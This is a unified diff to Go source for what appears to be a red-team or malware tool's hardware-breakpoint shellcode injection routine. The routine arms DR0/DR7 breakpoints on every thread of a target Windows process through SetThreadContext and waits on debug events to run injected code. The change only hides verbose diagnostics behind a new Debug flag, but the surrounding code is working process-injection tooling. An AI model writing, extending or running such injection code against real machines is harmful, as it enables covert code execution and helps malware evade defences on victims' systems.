@@ -73,6 +73,10 @@ type HwbpInjectionParams struct {
 	TargetAPI string
 	// TimeoutMs caps how long we wait for the breakpoint to hit.
 	TimeoutMs uint32
+	// Debug enables verbose per-event tracing in the debug-event loop and
+	// per-thread DR0/DR7 readback verification after arming. Off by default
+	// since output can be substantial (hundreds of LOAD_DLL events on Win11).
+	Debug bool
 }
 
 // resolveAPIFromTarget parses a "module!function" string and returns the
@@ -131,8 +135,11 @@ func enumerateProcessThreads(targetPID uint32) ([]uint32, error) {
 }
 
 // armThreadsWithBreakpoint sets DR0 = apiAddr (execution breakpoint, 1 byte)
-// on every thread in tids. Returns the count successfully patched.
-func armThreadsWithBreakpoint(tids []uint32, apiAddr uintptr) (int, []string) {
+// on every thread in tids. Returns the count successfully patched. When debug
+// is true, also reads back DR0/DR7 on the first 3 threads to verify the
+// SetContext write actually persisted (useful on Win11 23H2/VBS where the
+// kernel may store DR values without honoring them at execute time).
+func armThreadsWithBreakpoint(tids []uint32, apiAddr uintptr, debug bool) (int, []string) {
 	const dr7Enable = uint64(0x1) // local-enable Dr0, condition=execution, length=1 byte
 	patched := 0
 	var diags []string
@@ -148,8 +155,7 @@ func armThreadsWithBreakpoint(tids []uint32, apiAddr uintptr) (int, []string) {
 			injectCloseHandle(hThread)
 			continue
 		}
-		// Diagnostic: read back DR0/DR7 on the first 3 threads to verify the SetContext stuck.
-		if verifySamples < 3 {
+		if debug && verifySamples < 3 {
 			var verifyCtx CONTEXT_AMD64
 			verifyCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS
 			ret, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&verifyCtx)))
@@ -260,7 +266,7 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 	}
 	sb.WriteString(fmt.Sprintf("[*] Enumerated %d threads in target\n", len(tids)))
 
-	armed, armDiags := armThreadsWithBreakpoint(tids, apiAddr)
+	armed, armDiags := armThreadsWithBreakpoint(tids, apiAddr, params.Debug)
 	for _, d := range armDiags {
 		sb.WriteString("[-] " + d + "\n")
 	}
@@ -301,7 +307,7 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 			if _, ok := addrSamples[er.ExceptionCode]; !ok {
 				addrSamples[er.ExceptionCode] = uintptr(er.ExceptionAddress)
 			}
-			if tracedEvents < maxTraceEvents {
+			if params.Debug && tracedEvents < maxTraceEvents {
 				delta := int64(uintptr(er.ExceptionAddress)) - int64(apiAddr)
 				sb.WriteString(fmt.Sprintf("[debug] event#%d: code=0x%X addr=0x%X (apiAddr=0x%X, delta=%+d) firstChance=%d tid=%d\n",
 					tracedEvents, er.ExceptionCode, uintptr(er.ExceptionAddress), apiAddr, delta,
@@ -341,7 +347,7 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 			return sb.String(), fmt.Errorf("target process exited before breakpoint hit")
 		default:
 			otherEvents++
-			if tracedEvents < maxTraceEvents {
+			if params.Debug && tracedEvents < maxTraceEvents {
 				sb.WriteString(fmt.Sprintf("[debug] event#%d: non-exception code=%d tid=%d\n",
 					tracedEvents, event.DwDebugEventCode, event.DwThreadId))
 				tracedEvents++
@@ -363,7 +369,7 @@ done:
 	elapsedMs := time.Since(start).Milliseconds()
 	sb.WriteString(fmt.Sprintf("[*] Breakpoint hits: %d, other debug events: %d, elapsed: %dms\n",
 		breakpointHits, otherEvents, elapsedMs))
-	if len(codeCounts) > 0 {
+	if params.Debug && len(codeCounts) > 0 {
 		sb.WriteString("[*] Exception code distribution:\n")
 		for code, n := range codeCounts {
 			sb.WriteString(fmt.Sprintf("    code=0x%08X count=%d firstAddr=0x%X\n", code, n, addrSamples[code]))
